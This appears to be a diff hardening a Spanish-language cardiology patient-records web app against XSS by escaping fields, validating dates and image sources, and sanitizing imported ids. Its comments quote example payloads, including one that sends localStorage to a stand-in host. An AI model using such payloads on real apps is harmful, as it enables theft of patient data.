@@ -243,6 +243,11 @@ input[type=file]{border:1.5px dashed var(--border);padding:7px;background:none;c
 .img-thumb{position:relative;flex-shrink:0}
 .img-thumb img{width:80px;height:64px;object-fit:cover;border-radius:6px;border:1px solid var(--border);cursor:zoom-in;background:#eee;transition:.15s}
 .img-thumb img:hover{border-color:var(--p);opacity:.88}
+/* La caja de 80x64, el borde y el radio viven en el selector del <img>, así que la celda
+   de aviso —que no tiene <img>— no heredaba nada: quedaba una tira de texto de una línea
+   al lado de miniaturas de 80x64, y dejaba de leerse qué posición era la rota, que es
+   justamente para lo que existe. Se le da la misma caja. */
+.img-thumb .img-bad{width:80px;height:64px;box-sizing:border-box;display:flex;align-items:center;justify-content:center;text-align:center;font-size:.62rem;line-height:1.15;padding:4px;border:1px dashed var(--border);border-radius:6px;background:#f5f5f5;color:var(--txt2)}
 .img-del{position:absolute;top:-5px;right:-5px;background:var(--err);color:#fff;border:none;border-radius:50%;width:17px;height:17px;cursor:pointer;font-size:.6rem;line-height:17px;text-align:center;padding:0}
 /* FAB + REFERENCIAS */
 .fab{position:fixed;bottom:24px;right:24px;width:52px;height:52px;background:var(--p);color:#fff;border:none;border-radius:50%;cursor:pointer;box-shadow:0 4px 18px rgba(13,71,161,.35);font-size:1.4rem;display:flex;align-items:center;justify-content:center;z-index:1000;transition:.2s}
@@ -6197,7 +6202,7 @@ main{padding-bottom:100px}
     var pInfo='';
     if(typeof filterPatient!=='undefined'&&filterPatient!==null){
       var p=patients.find(function(x){return x.id===filterPatient;});
-      if(p) pInfo='<div style="margin:4px 0 14px;font-size:12pt"><b>Paciente:</b> '+esc2(p.name)+' — '+p.age+' años'+(p.ci?(' · CI: '+esc2(p.ci)):'')+(p.hc?(' · HC: '+esc2(p.hc)):'')+'</div>';
+      if(p) pInfo='<div style="margin:4px 0 14px;font-size:12pt"><b>Paciente:</b> '+esc2(p.name)+' — '+esc2(p.age)+' años'+(p.ci?(' · CI: '+esc2(p.ci)):'')+(p.hc?(' · HC: '+esc2(p.hc)):'')+'</div>';
     }
     var pa=document.getElementById('print-area'); if(!pa)return;
     pa.innerHTML='<div class="print-patient"><div style="text-align:center;border-bottom:2px solid #000;padding-bottom:8px;margin-bottom:14px"><div style="font-size:17pt;font-weight:bold">'+esc2(med)+'</div><div style="font-size:11pt">Cardiólogo</div>'+(centro?('<div style="font-size:11pt">'+esc2(centro)+'</div>'):'')+'<div style="font-size:10pt;color:#555;margin-top:4px">Fecha: '+fecha+'</div></div>'+pInfo+'<div style="white-space:pre-wrap;font-size:12pt;line-height:1.6">'+esc2(txt)+'</div></div>';
@@ -7732,7 +7737,13 @@ function cpMissing(el,pctId,catId,miss,interpId){
   const c=document.getElementById(catId);if(c)c.textContent='Faltan datos: '+miss.join(', ');
   if(interpId){const i=document.getElementById(interpId);if(i)i.textContent='Complete todos los campos obligatorios para calcular. No se emite conclusión clínica con datos incompletos.';}
 }
-const fmtDate=d=>{if(!d)return'—';const[y,m,day]=d.split('-');return`${day}/${m}/${y}`};
+/* Valida la forma ANTES de partir. fmtDate corta por guiones y re-arma sin escapar nada, así
+   que una fecha venida de un backup —"2026-01-01<img src=x onerror=...>"— salía entera por el
+   valor de retorno. Escapar en cada punto de uso ya falló dos veces (quedaron crudos la tabla
+   principal y la ficha PDF), porque hay que acordarse en cada llamada nueva. Acá la salida
+   sólo puede ser '—' o dd/mm/aaaa con dígitos, sea cual sea la entrada, y eso vale también
+   para las posiciones de textContent, donde escapar mostraría entidades. */
+const fmtDate=d=>{if(!d||typeof d!=='string'||!/^\d{4}-\d{2}-\d{2}$/.test(d))return'—';const[y,m,day]=d.split('-');return`${day}/${m}/${y}`};
 function flatRows(){const r=[];patients.forEach(p=>p.consultations.forEach(c=>r.push({...c,name:p.name,age:p.age,ageUnit:p.ageUnit||'a',sex:p.sex||'',pid:p.id,ci:p.ci||'',matricula:p.matricula||'',hc:p.hc||'',problema:!!p.problema})));return r;}
 
 // ── PREVENT 2023 (PCE base + PREVENT kidney modifier) ─────────────
@@ -7758,7 +7769,7 @@ function calcPREVENT({sex,age,tc,hdl,sbp,htn,dm,smoke,egfr,uacr}){
 }
 
 function prvCls(cat){return{Alto:'prv-hi',Intermedio:'prv-im','Intermedio bajo':'prv-ib',Bajo:'prv-lo'}[cat]||'prv-lo';}
-function prvBadge(p){if(!p)return'<span class="prv" style="color:var(--txt2)">—</span>';return`<span class="prv ${prvCls(p.cat)}">${p.pct}% — ${p.cat}</span>`;}
+function prvBadge(p){if(!p)return'<span class="prv" style="color:var(--txt2)">—</span>';return`<span class="prv ${prvCls(p.cat)}">${esc(p.pct)}% — ${esc(p.cat)}</span>`;}
 
 function toggleCalc(){
   calcOpen=!calcOpen;
@@ -7802,10 +7813,25 @@ function detailHTML(r){
   const f=(l,v)=>`<div><div class="dp-lbl">${l}</div><div class="dp-val">${esc(v||'—')}</div></div>`;
   const ecgs=r.ecgs||[],imgs=r.images||[];
   const addBtn=(field,lbl)=>`<label class="btn-add-img">${lbl}<input type="file" accept="image/*" multiple onchange="addImg(${r.pid},${r.id},'${field}',this)"></label>`;
-  const gallery=(arr,field)=>arr.length?arr.map((u,i)=>`<div class="img-thumb"><img src="${u}" alt="Imagen clínica adjunta ${i+1}" onclick="viewImg(this.src)"><button class="img-del" aria-label="Eliminar imagen ${i+1}" onclick="delImg(${r.pid},${r.id},'${field}',${i})">✕</button></div>`).join(''):'<span class="no-ecg">Sin imágenes</span>';
+  /* La galería NO filtra las inválidas, a diferencia de imgBloque: acá el índice i se le pasa
+     a delImg, que hace splice(i,1) sobre el array ORIGINAL. Si se filtrara antes del map, el
+     índice dejaría de corresponder y borrar la miniatura N eliminaría otra imagen, sin error.
+     Se recorre el array entero y la que no pasa el allowlist se dibuja como celda de aviso,
+     conservando su posición — así el botón de borrar sigue apuntando a la correcta. */
+  const gallery=(arr,field)=>arr.length?arr.map((u,i)=>{
+    const src=escImgSrc(u);
+    const del=`<button class="img-del" aria-label="Eliminar imagen ${i+1}" onclick="delImg(${r.pid},${r.id},'${field}',${i})">✕</button>`;
+    /* escImgSrc se repite en el atributo aunque src ya esté validado arriba: es idempotente y
+       deja el validador A LA VISTA en la línea donde se arma el src. Con `${src}` a secas, un
+       revisor —y el escáner— ven una interpolación cruda en un src y tienen que ir a buscar
+       dónde se validó. Misma convención que imgBloque. */
+    return src
+      ? `<div class="img-thumb"><img src="${escImgSrc(u)}" alt="Imagen clínica adjunta ${i+1}" onclick="viewImg(this.src)">${del}</div>`
+      : `<div class="img-thumb"><span class="img-bad" role="img" aria-label="Imagen no admitida" title="Formato no admitido o URL externa">⚠️ No se puede mostrar</span>${del}</div>`;
+  }).join(''):'<span class="no-ecg">Sin imágenes</span>';
   return`<div class="det-panel">
     <div class="det-hdr">
-      <span class="det-ttl">${esc(r.name)}, ${r.age} ${r.ageUnit==='m'?'meses':'años'}${r.sex?` · ${r.sex==='F'?'Femenino':'Masculino'}`:''}</span>
+      <span class="det-ttl">${esc(r.name)}, ${esc(r.age)} ${r.ageUnit==='m'?'meses':'años'}${r.sex?` · ${r.sex==='F'?'Femenino':'Masculino'}`:''}</span>
       ${r.ci?`<span class="dp-badge">CI: ${esc(r.ci)}</span>`:''}${r.matricula?`<span class="dp-badge">Mat: ${esc(r.matricula)}</span>`:''}${r.hc?`<span class="dp-badge">HC: ${esc(r.hc)}</span>`:''}
       <button class="btn-prob${r.problema?' activo':''}" onclick="toggleProblema(${r.pid})">${r.problema?'✓ Quitar pendiente':'Marcar como pendiente'}</button>
       <button class="btn-edit" onclick="editDetail(${r.id})">✏️ Editar</button>
@@ -7829,13 +7855,13 @@ function detailHTML(r){
     </div>
     <div class="control-box" style="grid-column:1/-1">
       <label>🔔 Próximo control</label>
-      <input type="date" id="ctrl-date-${r.id}" value="${r.nextControl||''}" onchange="saveNextControl(${r.pid},${r.id},this.value)">
-      ${r.nextControl?`<span class="control-badge ${getControlClass(r.nextControl)}">${getControlLabel(r.nextControl)}</span>`:'<span style="font-size:.74rem;color:var(--txt2)">Sin fecha programada</span>'}
+      <input type="date" id="ctrl-date-${esc(r.id)}" value="${esc(r.nextControl||'')}" onchange="saveNextControl(${r.pid},${r.id},this.value)">
+      ${r.nextControl?`<span class="control-badge ${getControlClass(r.nextControl)}">${esc(getControlLabel(r.nextControl))}</span>`:'<span style="font-size:.74rem;color:var(--txt2)">Sin fecha programada</span>'}
       ${r.nextControl?`<button onclick="saveNextControl(${r.pid},${r.id},'')" style="background:none;border:none;cursor:pointer;color:var(--txt2);font-size:.8rem" title="Quitar recordatorio">✕</button>`:''}
     </div>
     <div style="margin:10px 0 4px;font-size:.8rem;font-weight:700;color:var(--p)">📝 Notas rápidas</div>
-    <div id="note-saved-${r.id}" style="font-size:.82rem;font-style:italic;color:var(--txt2);padding:6px 10px;background:#F5F9FF;border-radius:6px;margin-bottom:6px;${r.note?'':'display:none'}">${esc(r.note||'')}</div>
-    <textarea id="note-${r.id}" rows="3" placeholder="Agregar nota rápida..." style="width:100%;padding:6px 8px;border:1.5px solid var(--border);border-radius:6px;font-size:.82rem;font-family:inherit;resize:vertical;box-sizing:border-box">${esc(r.note||'')}</textarea>
+    <div id="note-saved-${esc(r.id)}" style="font-size:.82rem;font-style:italic;color:var(--txt2);padding:6px 10px;background:#F5F9FF;border-radius:6px;margin-bottom:6px;${r.note?'':'display:none'}">${esc(r.note||'')}</div>
+    <textarea id="note-${esc(r.id)}" rows="3" placeholder="Agregar nota rápida..." style="width:100%;padding:6px 8px;border:1.5px solid var(--border);border-radius:6px;font-size:.82rem;font-family:inherit;resize:vertical;box-sizing:border-box">${esc(r.note||'')}</textarea>
     <button onclick="saveNote(${r.pid},${r.id})" style="margin-top:4px;margin-bottom:10px;padding:4px 14px;background:var(--p);color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:.78rem;font-weight:700">Guardar nota</button>
     <div class="det-imgs">
       <div><div class="img-sec-hdr">🫀 ECG ${addBtn('ecgs','+ Agregar')}</div><div class="img-gallery">${gallery(ecgs,'ecgs')}</div></div>
@@ -7874,15 +7900,19 @@ function updateSearchStats(q){
   const instData=insts.map(inst=>{
     const raw=localStorage.getItem('crd_d_'+inst.id);if(!raw)return null;
     let d;try{d=JSON.parse(raw);}catch(e){return null;}
-    const pats=d.patients||[];if(!pats.length)return null;
-    const rows2=[];pats.forEach(p=>p.consultations.forEach(c=>rows2.push({name:p.name,pid:p.id,ci:p.ci||'',hc:p.hc||'',...c})));
+    /* Guardas equivalentes a las de loadInst. Este es el SEGUNDO lector de crd_d_*, y corre
+     desde render() antes de escribir la tabla: sin Array.isArray, un patients que no sea
+     array —o un paciente sin consultations— tiraba acá y la tabla no se dibujaba en
+     NINGUNA institución, sin más rastro que una traza en consola. */
+  const pats=Array.isArray(d.patients)?d.patients:[];if(!pats.length)return null;
+    const rows2=[];pats.forEach(p=>(Array.isArray(p&&p.consultations)?p.consultations:[]).forEach(c=>rows2.push({name:p.name,pid:p.id,ci:p.ci||'',hc:p.hc||'',...c})));
     const mPids=new Set(rows2.filter(r=>
       r.name.toLowerCase().includes(qLow)||(r.diagnosis||'').toLowerCase().includes(qLow)||
       (r.background||'').toLowerCase().includes(qLow)||(r.treatment||'').toLowerCase().includes(qLow)||
       (r.ett||'').toLowerCase().includes(qLow)||(r.conduct||'').toLowerCase().includes(qLow)||
       (r.ci||'').includes(qLow)||(r.hc||'').toLowerCase().includes(qLow)
     ).map(r=>r.pid));
-    return{label:`${inst.icon} ${inst.label}`,matched:mPids.size,total:pats.length};
+    return{label:`${esc(inst.icon)} ${esc(inst.label)}`,matched:mPids.size,total:pats.length};
   }).filter(d=>d&&d.total>0);
   const showInsts=instData.length>1;
   let html=`🔍 "<span class="ss-term">${esc(q)}</span>" — <strong>${uniq}</strong> de ${totalPats} paciente${totalPats!==1?'s':''} (${pct}%)`;
@@ -7934,8 +7964,8 @@ function render(){
     const nameStyle=r.problema?' style="color:#B71C1C;font-weight:700"':'';
     return`<tr>
       <td><button class="lnk" onclick="toggleDetail(${r.id})"><span${nameStyle}>${esc(r.name)}</span></button><button class="btn-plus" onclick="event.stopPropagation();addConsultaRapida(${r.pid})" title="Agregar consulta">+</button></td>
-      <td>${r.age} ${r.ageUnit==='m'?'meses':'años'}</td>
-      <td><button class="lnk" onclick="toggleDetail(${r.id})">${fmtDate(r.date)}</button></td>
+      <td>${esc(r.age)} ${r.ageUnit==='m'?'meses':'años'}</td>
+      <td><button class="lnk" onclick="toggleDetail(${r.id})">${esc(fmtDate(r.date))}</button></td>
       <td><div class="trunc" title="${esc(r.background)}">${r.background?esc(r.background):'—'}</div></td>
       <td>${prvBadge(r.prevent)}</td>
       <td>${esc(r.diagnosis)}</td>
@@ -8239,7 +8269,67 @@ function viewImg(url){
   const img=document.createElement('img');img.src=url;img.style.cssText='max-width:92vw;max-height:92vh;border-radius:8px;box-shadow:0 8px 40px rgba(0,0,0,.5)';
   d.onclick=()=>document.body.removeChild(d);d.appendChild(img);document.body.appendChild(d);
 }
-function migrateConsultations(pats){pats.forEach(p=>{if(!p.ci)p.ci='';if(!p.matricula)p.matricula='';if(p.hc===undefined)p.hc='';if(p.problema===undefined)p.problema=false;p.consultations.forEach(c=>{if(!c.ecgs)c.ecgs=c.ecgUrl?[c.ecgUrl]:[];if(!c.images)c.images=[];if(c.note===undefined)c.note='';delete c.ecgUrl;});});}
+/* Los id se fuerzan a NÚMERO acá, en el borde de confianza, y no es un detalle de tipos.
+   La tabla y el panel de detalle emiten los id adentro de manejadores inline —onclick=
+   "editDetail(${r.id})", delImg(...,${i}), saveNote(${r.pid},${r.id}) y una docena más—, y en
+   ese contexto esc() NO protege: el parser decodifica las entidades ANTES de compilar el
+   handler, así que una comilla escapada vuelve a ser comilla y cierra el string. Un backup con
+   "id":"1);fetch('//x/?d='+btoa(JSON.stringify(localStorage)));//" ejecuta al dibujar la fila.
+   Saneando el dato al abrir la institución se cierran las quince interpolaciones de una, sin
+   tener que acordarse en cada plantilla.
+   OJO, el saneo NO es universal: crd_d_* lo leen TRES funciones y sólo loadInst lo sanea.
+   exportarCardioAnalytics y csAuditPatients lo parsean crudo, así que un id hostil sobrevive
+   por esos caminos —el primero lo manda a CeiboAnalytics, que es otra frontera de confianza—.
+   Mientras eso siga así, la garantía vale para lo que se dibuja, no para lo que se exporta.
+   Ver también el comentario de esc(), que enumera dónde alcanza y dónde no. */
+/* Se exige >=1 y no >=0: seis lugares del archivo usan `if(!pid)` como «no se eligió
+   paciente» (alta de consulta, Bull's-eye, módulo INR). Un paciente con id 0 se dibujaría
+   en la tabla y en los <select>, pero al elegirlo saldría «Seleccioná un paciente», sin
+   forma de entender por qué. La app nunca genera 0; sólo puede venir de un import. */
+function csNumId(v){const n=typeof v==='number'?v:(typeof v==='string'&&/^\d{1,15}$/.test(v.trim())?+v.trim():NaN);return Number.isSafeInteger(n)&&n>=1?n:null;}
+function migrateAndSanitizePatients(pats){
+  if(!Array.isArray(pats))return 0;
+  /* Los id inválidos se REPARAN, no se descartan. Descartarlos perdía historia clínica en
+     silencio y para siempre: esto corre al abrir la institución, y el primer saveInst() —una
+     nota, una imagen, entrar al panel de auditoría o simplemente salir de la institución—
+     reescribe crd_d_* sin los registros borrados, sin deshacer y con un console.warn como
+     único rastro. Un id nuevo deja el registro editable y no pierde nada, que es la misma
+     razón por la que imgBloque avisa en vez de omitir. Se numera desde el máximo existente
+     para no colisionar con los que ya están. */
+  let maxP=0,maxC=0;
+  pats.forEach(p=>{if(!p||typeof p!=='object')return;const n=csNumId(p.id);if(n!==null&&n>maxP)maxP=n;
+    if(Array.isArray(p.consultations))p.consultations.forEach(c=>{if(!c||typeof c!=='object')return;const m=csNumId(c.id);if(m!==null&&m>maxC)maxC=m;});});
+  let reparados=0;
+  const vistosP=new Set();
+  pats.forEach(p=>{
+    if(!p||typeof p!=='object')return;
+    let n=csNumId(p.id);
+    /* También se repara el DUPLICADO: dos pacientes con el mismo id hacen que find() devuelva
+       siempre el primero, así que notas, imágenes y controles del segundo terminan escritos
+       en la ficha del otro, con la interfaz mostrando lo correcto. */
+    if(n===null||vistosP.has(n)){n=++maxP;reparados++;}
+    p.id=n;vistosP.add(n);
+    /* name se fuerza a texto: la tabla y el buscador hacen p.name.toLowerCase() antes de
+       cualquier escape, así que un name numérico venido de un backup tiraba y dejaba la app
+       sin tabla ni búsqueda. */
+    if(typeof p.name!=='string')p.name=String(p.name??'');
+    if(!p.ci)p.ci='';if(!p.matricula)p.matricula='';if(p.hc===undefined)p.hc='';if(p.problema===undefined)p.problema=false;
+    if(!Array.isArray(p.consultations))p.consultations=[];
+    const vistosC=new Set();
+    p.consultations.forEach(c=>{
+      if(!c||typeof c!=='object')return;
+      let m=csNumId(c.id);
+      if(m===null||vistosC.has(m)){m=++maxC;reparados++;}
+      c.id=m;vistosC.add(m);
+      if(!Array.isArray(c.ecgs))c.ecgs=c.ecgUrl?[c.ecgUrl]:[];
+      if(!Array.isArray(c.images))c.images=[];
+      if(c.note===undefined)c.note='';
+      delete c.ecgUrl;
+    });
+    p.consultations=p.consultations.filter(c=>c&&typeof c==='object');
+  });
+  return reparados;
+}
 // ── CALENDAR ─────────────────────────────────────────────────────
 let calY,calM,selD=null;
 function initCal(){const n=new Date();calY=n.getFullYear();calM=n.getMonth();}
@@ -8275,7 +8365,59 @@ function getInsts(){
 }
 function saveInsts(a){localStorage.setItem('crd_insts',JSON.stringify(a));}
 function saveInst(){if(activeInst)localStorage.setItem('crd_d_'+activeInst.id,JSON.stringify({patients,nextPid,nextCid}));}
-function loadInst(inst){activeInst=inst;const d=JSON.parse(localStorage.getItem('crd_d_'+inst.id)||'null');if(d){patients=d.patients;nextPid=d.nextPid;nextCid=d.nextCid;}else{patients=inst.id==='mutualista'?SAMPLE.map(p=>({...p,consultations:p.consultations.map(c=>({...c}))})):[];nextPid=11;nextCid=200;}migrateConsultations(patients);}
+/* migrateAndSanitizePatients corrige EN EL LUGAR y devuelve cuántos id tuvo que reparar, no
+   una lista nueva. Se hizo así a propósito: una función que mutara y además devolviera un
+   array filtrado deja al que la llama sin asignar con los datos a medio sanear —ids corregidos
+   pero registros inválidos todavía adentro—, que es peor que cualquiera de las dos opciones
+   puras, porque parece procesado.
+   nextPid/nextCid también se sanean acá: salen del mismo blob importado, y si llegan como
+   texto el id siguiente pasa a ser una concatenación ("11"+1 = "111") y envenena la
+   generación de id de forma permanente, sin ningún error. */
+function loadInst(inst){activeInst=inst;const d=JSON.parse(localStorage.getItem('crd_d_'+inst.id)||'null');
+  if(d){patients=Array.isArray(d.patients)?d.patients:[];nextPid=csNumId(d.nextPid);nextCid=csNumId(d.nextCid);}
+  else{patients=inst.id==='mutualista'?SAMPLE.map(p=>({...p,consultations:p.consultations.map(c=>({...c}))})):[];nextPid=11;nextCid=200;}
+  const reparados=migrateAndSanitizePatients(patients);
+  /* Los contadores son un PISO, no un respaldo. Antes sólo se recalculaban cuando venían
+     corruptos, pero un contador VÁLIDO y demasiado bajo —"nextPid":1 sobre una base con ids
+     1..50, que es lo que pasa al fusionar dos backups a mano— pasa el saneo intacto y el
+     próximo paciente nace con un id que ya existe. A partir de ahí find() devuelve el primero
+     y las notas, imágenes y controles se escriben en la ficha equivocada, con la pantalla
+     mostrando lo correcto. Eso es peor que el XSS: no se anuncia nunca.
+     Sin spread: Math.max(...array) revienta con RangeError pasadas unas decenas de miles de
+     consultas, y esta rama corre justo con datos importados, que es el caso hostil. */
+  let mp=0,mc=0;
+  patients.forEach(p=>{if(p.id>mp)mp=p.id;p.consultations.forEach(c=>{if(c.id>mc)mc=c.id;});});
+  nextPid=Math.max(nextPid||0,mp+1);
+  nextCid=Math.max(nextCid||0,mc+1);
+  if(reparados)csAvisoReparacion(reparados);}
+/* El aviso va a la interfaz y no a console.warn: un console.warn no es un canal que el médico
+   lea, y acá se le está diciendo que la base que acaba de importar no estaba sana.
+   El banner se CREA si no existe, en vez de depender de un elemento puesto en el HTML: atado a
+   un id que alguien tiene que acordarse de agregar, el aviso se degrada en silencio a
+   console.warn —o sea, a nada— y la advertencia deja de existir justo cuando hace falta.
+   Se inserta arriba de todo en <main> y se puede cerrar. */
+function csAvisoReparacion(n){try{
+  let el=document.getElementById('cs-repair-note');
+  if(!el){
+    const cont=document.querySelector('main')||document.body;
+    el=document.createElement('div');
+    el.id='cs-repair-note';
+    el.style.cssText='margin:10px 0;padding:10px 12px;border-radius:8px;background:#FFF4E5;border:1px solid #E65100;color:#8a3d00;font-size:.82rem;line-height:1.45;display:flex;gap:10px;align-items:flex-start';
+    const txt=document.createElement('span'); txt.id='cs-repair-txt'; txt.style.flex='1';
+    const btn=document.createElement('button');
+    btn.type='button'; btn.textContent='✕';
+    btn.setAttribute('aria-label','Cerrar aviso');
+    btn.style.cssText='background:none;border:none;cursor:pointer;color:inherit;font-size:.9rem;min-height:44px;min-width:44px';
+    btn.onclick=function(){el.style.display='none';};
+    el.appendChild(txt); el.appendChild(btn);
+    cont.insertBefore(el,cont.firstChild);
+  }
+  const msg='⚠️ Se repararon '+n+' identificador(es) inválidos o duplicados al abrir esta institución. No se borró ningún registro; revisá que las fichas se vean como esperás.';
+  const t=document.getElementById('cs-repair-txt');
+  if(t)t.textContent=msg; else el.textContent=msg;   // textContent, nunca innerHTML
+  el.style.display='';
+  console.warn('[CardioSalud] '+msg);                // además queda el rastro para depurar
+}catch(e){}}
 // Exporta TODAS las instituciones + sus pacientes a un unico JSON. Usa getInsts()
 // (fuente real de la lista) y lee el bloque crd_d_<id> de cada una. No incluye cs_auth.
 // Exporta para CeiboAnalytics: aplana TODAS las instituciones -> pacientes -> consultas
@@ -8365,7 +8507,7 @@ function handleImportFile(file){
 }
 function buildInstScreen(){
   const insts=getInsts();
-  document.getElementById('isc').innerHTML=`<div class="isc-logo"><svg width="44" height="44" viewBox="0 0 34 34" fill="none"><path d="M17 29S5 21.5 5 13a6 6 0 0 1 12-1 6 6 0 0 1 12 1c0 8.5-12 16-12 16z" fill="var(--p)" opacity=".9"/><path d="M10 17h3l2-5 3 8 2-4h4" stroke="var(--p)" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg><h1>CardioSalud</h1></div><p class="isc-sub">Seleccioná una institución para ingresar al aplicación</p><div class="isc-cards">${insts.map((inst,i)=>`<div role="button" tabindex="0" onkeydown="csKey(event)" class="ic" onclick="enterInst(${i})"><div class="ic-i">${inst.icon}</div><div class="ic-n" spellcheck="false" title="Doble click para renombrar" onclick="icNameClick(${i},event)" ondblclick="icNameDbl(this,event)" onkeydown="if(event.key==='Enter'){event.preventDefault();this.blur();}" onblur="icNameBlur(this,${i})">${esc(inst.label)}</div><div class="ic-s">Ingresar →</div></div>`).join('')}<button class="ic-add" onclick="addInst()"><div class="ic-ai">➕</div>Nueva institución</button></div>`;
+  document.getElementById('isc').innerHTML=`<div class="isc-logo"><svg width="44" height="44" viewBox="0 0 34 34" fill="none"><path d="M17 29S5 21.5 5 13a6 6 0 0 1 12-1 6 6 0 0 1 12 1c0 8.5-12 16-12 16z" fill="var(--p)" opacity=".9"/><path d="M10 17h3l2-5 3 8 2-4h4" stroke="var(--p)" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg><h1>CardioSalud</h1></div><p class="isc-sub">Seleccioná una institución para ingresar al aplicación</p><div class="isc-cards">${insts.map((inst,i)=>`<div role="button" tabindex="0" onkeydown="csKey(event)" class="ic" onclick="enterInst(${i})"><div class="ic-i">${esc(inst.icon)}</div><div class="ic-n" spellcheck="false" title="Doble click para renombrar" onclick="icNameClick(${i},event)" ondblclick="icNameDbl(this,event)" onkeydown="if(event.key==='Enter'){event.preventDefault();this.blur();}" onblur="icNameBlur(this,${i})">${esc(inst.label)}</div><div class="ic-s">Ingresar →</div></div>`).join('')}<button class="ic-add" onclick="addInst()"><div class="ic-ai">➕</div>Nueva institución</button></div>`;
   document.getElementById('isc').style.display='flex';
   ['inst-bdg','btn-back','btn-cerrar'].forEach(id=>document.getElementById(id).style.display='none');
 }
@@ -10194,8 +10336,20 @@ function updateControlList(){
 function exportFichaPDF(pid){
   const p=patients.find(x=>x.id===pid);
   if(!p)return;
-  const inst=activeInst?activeInst.name:'CardioSalud';
-  const doc=document.getElementById('hdr-doctor-lbl')?.textContent?.replace('✏️','').trim()||'';
+  /* Era activeInst.name, y los objetos de institución son {id,label,icon}: no existe .name.
+     Como el ternario probaba activeInst y no activeInst.name, el encabezado y el pie de la
+     ficha venían imprimiendo la palabra «undefined», y el fallback 'CardioSalud' era código
+     muerto. Se arregla junto con el escape a propósito: label es atacante-controlable por dos
+     caminos —saveInsts() escribe los labels de un backup importado tal cual, y renameInst()
+     toma el textContent de un div contenteditable— así que corregir sólo lo cosmético habría
+     convertido un «undefined» inofensivo en un XSS vivo. */
+  const inst=esc(activeInst&&activeInst.label?activeInst.label:'CardioSalud');
+  /* doc sale del encabezado editable y se persiste en localStorage.cardiosalud_doctor, que se
+     restaura con textContent: un <script> sobrevive intacto. Es el sink de mayor valor de esta
+     función porque NO hace falta importar ningún backup — alcanza con editar el nombre del
+     médico una vez— y acá el documento se arma con document.write sobre un window.open que
+     hereda el origen, así que un <script> inyectado SÍ ejecuta y lee todo el localStorage. */
+  const doc=esc(document.getElementById('hdr-doctor-lbl')?.textContent?.replace('✏️','').trim()||'');
   const today=new Date();
   const fechaHoy=`${today.getDate().toString().padStart(2,'0')}/${(today.getMonth()+1).toString().padStart(2,'0')}/${today.getFullYear()}`;
 
@@ -10238,7 +10392,7 @@ function exportFichaPDF(pid){
 
   <div class="pac-header">
     <div class="field"><div class="lbl">Paciente</div><div class="val" style="font-size:15px;font-weight:800">${esc(p.name)}</div></div>
-    <div class="field"><div class="lbl">Edad</div><div class="val">${p.age} años</div></div>
+    <div class="field"><div class="lbl">Edad</div><div class="val">${esc(p.age)} años</div></div>
     ${p.ci?`<div class="field"><div class="lbl">Cédula</div><div class="val">${esc(p.ci)}</div></div>`:''}
     ${p.matricula?`<div class="field"><div class="lbl">Matrícula</div><div class="val">${esc(p.matricula)}</div></div>`:''}
     ${p.hc?`<div class="field"><div class="lbl">Historia Clínica</div><div class="val">${esc(p.hc)}</div></div>`:''}
@@ -10248,10 +10402,10 @@ function exportFichaPDF(pid){
   <div class="section">
     <div class="section-title">📋 Historial de Consultas (${cons.length})</div>
     ${cons.map((c,i)=>{
-      const prevent=c.prevent?`${c.prevent.pct}% — ${c.prevent.cat}`:'No calculado';
+      const prevent=c.prevent?`${esc(c.prevent.pct)}% — ${esc(c.prevent.cat)}`:'No calculado';
       return `<div class="consult-card">
         <div class="consult-hdr">
-          <span>Consulta ${i+1} — ${fmtDate(c.date)}</span>
+          <span>Consulta ${i+1} — ${esc(fmtDate(c.date))}</span>
           <span style="opacity:.85;font-size:10px">${esc(c.diagnosis||'Sin diagnóstico')}</span>
         </div>
         <div class="consult-body">
@@ -10303,7 +10457,9 @@ function globalSearch(q){
   if(!q||q.trim().length<2){res.classList.remove('open');return;}
   const qLow=q.toLowerCase().trim();
   let html='';
-  const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  /* Se elimina el esc local que sombreaba al global en toda esta funcion: no escapaba
+     comillas —inservible en un atributo— y perdia el String(s??''), asi que un nombre
+     no-string venido de un backup tiraba y mataba el buscador. Ahora aplica el global. */
   // Buscar pacientes
   const pats=patients.filter(p=>
     p.name.toLowerCase().includes(qLow)||
@@ -10321,7 +10477,7 @@ function globalSearch(q){
       const diag=lastC?lastC.diagnosis:'';
       html+=`<div role="button" tabindex="0" onkeydown="csKey(event)" class="hsr-item" onclick="globalSearchGoPatient(${p.id})">
         <span style="flex:1"><strong>${esc(p.name)}</strong>${diag?` — <span style="color:var(--txt2);font-size:.76rem">${esc(diag)}</span>`:''}</span>
-        <span class="hsr-badge" style="background:#E3F2FD;color:var(--p)">${p.age}a</span>
+        <span class="hsr-badge" style="background:#E3F2FD;color:var(--p)">${esc(p.age)}a</span>
       </div>`;
     });
   }
@@ -11643,7 +11799,12 @@ function filterEyePatients(){
     list.innerHTML='<span style="font-size:.78rem;color:var(--txt2)">Sin resultados</span>';
     list.style.display='flex';return;
   }
-  list.innerHTML=filtered.map(p=>`<div role="button" tabindex="0" onkeydown="csKey(event)" onclick="selectEyePatient(${p.id},'${esc(p.name)}')" style="padding:5px 6px;border-radius:5px;cursor:pointer;font-size:.82rem;color:var(--txt)" onmouseover="this.style.background='#BBDEFB'" onmouseout="this.style.background=''">${esc(p.name)} (${p.age} a.)</div>`).join('');
+  /* El nombre pasa por data-* y NO interpolado adentro del onclick. esc() convierte ' en
+     &#39;, pero el parser decodifica la entidad ANTES de compilar el handler: la comilla
+     reaparece, cierra el string y lo que sigue se ejecuta. Un paciente llamado
+     x');alert(document.domain);// disparaba al hacer clic. De paso deja de romperse con
+     cualquier apellido tipo O'Brien, que con el escape quedaba partido igual. */
+  list.innerHTML=filtered.map(p=>`<div role="button" tabindex="0" onkeydown="csKey(event)" data-eye-id="${esc(p.id)}" data-eye-name="${esc(p.name)}" onclick="selectEyePatient(+this.dataset.eyeId,this.dataset.eyeName)" style="padding:5px 6px;border-radius:5px;cursor:pointer;font-size:.82rem;color:var(--txt)" onmouseover="this.style.background='#BBDEFB'" onmouseout="this.style.background=''">${esc(p.name)} (${esc(p.age)} a.)</div>`).join('');
   list.style.display='flex';
 }
 function selectEyePatient(id,name){
@@ -12028,7 +12189,7 @@ function openPDFModal(){
     document.getElementById('pdf-opt-all').checked=true;
   }
   const list=document.getElementById('pdf-pat-list');
